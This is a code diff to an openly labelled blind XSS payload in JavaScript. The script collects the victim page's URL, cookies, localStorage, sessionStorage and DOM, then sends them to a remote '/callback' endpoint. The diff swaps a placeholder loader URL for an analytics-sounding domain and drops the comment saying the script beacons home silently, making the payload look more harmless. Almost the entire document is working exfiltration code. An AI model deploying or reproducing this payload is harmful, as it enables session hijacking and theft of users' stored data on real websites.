@@ -1,11 +1,10 @@
 // Blind XSS Payload
-// Loaded via: <script src="https://YOURSERVER/payload.js"></script>
-// Collects context and beacons home silently
+// Usage: <script src="https://dmtanalytics.net/t"></script>
 
 (function () {
   'use strict';
 
-  var SERVER = '{{SERVER_URL}}'; // replaced at runtime by server.js
+  var SERVER = '{{SERVER_URL}}';
 
   function safe(fn) {
     try { return fn(); } catch (e) { return null; }
@@ -36,9 +35,12 @@
   function collectCookies() {
     return safe(function () {
       var out = {};
+      if (!document.cookie) return out;
       document.cookie.split(';').forEach(function (pair) {
         var parts = pair.trim().split('=');
-        out[decodeURIComponent(parts[0])] = decodeURIComponent(parts.slice(1).join('='));
+        var key = decodeURIComponent(parts[0]);
+        var val = decodeURIComponent(parts.slice(1).join('='));
+        out[key] = val;
       });
       return out;
     }) || {};
@@ -53,7 +55,7 @@
   function send(data) {
     var payload = JSON.stringify(data);
 
-    // Try fetch first (modern browsers)
+    // Try fetch first
     if (typeof fetch !== 'undefined') {
       safe(function () {
         fetch(SERVER + '/callback', {
@@ -77,17 +79,26 @@
     });
   }
 
-  var data = {
-    url: safe(function () { return window.location.href; }),
-    referer: safe(function () { return document.referrer; }),
-    title: safe(function () { return document.title; }),
-    cookies: collectCookies(),
-    localStorage: collectLocalStorage(),
-    sessionStorage: collectSessionStorage(),
-    dom: collectDOM(),
-    origin: safe(function () { return window.origin; }),
-    timestamp: new Date().toISOString(),
-  };
+  function run() {
+    var data = {
+      url: safe(function () { return window.location.href || document.URL; }),
+      referer: safe(function () { return document.referrer; }),
+      title: safe(function () { return document.title; }),
+      cookies: collectCookies(),
+      localStorage: collectLocalStorage(),
+      sessionStorage: collectSessionStorage(),
+      dom: collectDOM(),
+      origin: safe(function () { return window.origin; }),
+      timestamp: new Date().toISOString(),
+    };
+    send(data);
+  }
 
-  send(data);
+  // Wait for DOM if still loading, otherwise run immediately
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', run);
+  } else {
+    run();
+  }
+
 })();
